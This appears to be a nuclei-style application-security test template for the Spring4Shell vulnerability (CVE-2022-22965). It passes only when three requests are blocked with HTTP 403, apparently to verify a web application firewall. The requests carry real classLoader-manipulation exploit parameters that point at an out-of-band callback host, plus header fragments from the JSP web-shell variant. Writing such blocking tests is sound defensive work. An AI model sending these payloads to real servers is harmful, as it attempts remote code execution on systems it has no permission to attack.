id: CVE-2022-22965
info:
  name: CVE-2022-22965
  author: crowdsec
  severity: info
  description: CVE-2022-22965 testing
  tags: appsec-testing
http:
  - raw:
      - |
        POST {{BaseURL}} HTTP/1.1
        Content-Type: application/x-www-form-urlencoded

        class.module.classLoader.resources.context.configFile={{interact_protocol}}://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx
      - |
        GET /?class.module.classLoader.resources.context.configFile={{interact_protocol}}://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx HTTP/1.1
      - |
        POST {{BaseURL}} HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        suffix: %>//
        c1: Runtime
        c2: <%
        DNT: 1

        class.module.classLoader.resources.context.configFile={{interact_protocol}}://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx        

    payloads:
      interact_protocol:
        - "http"
        - https

    cookie-reuse: true
    matchers:
    - type: dsl
      condition: and
      dsl:
        - 'status_code_1 == 403'
        - 'status_code_2 == 403'
        - 'status_code_3 == 403'

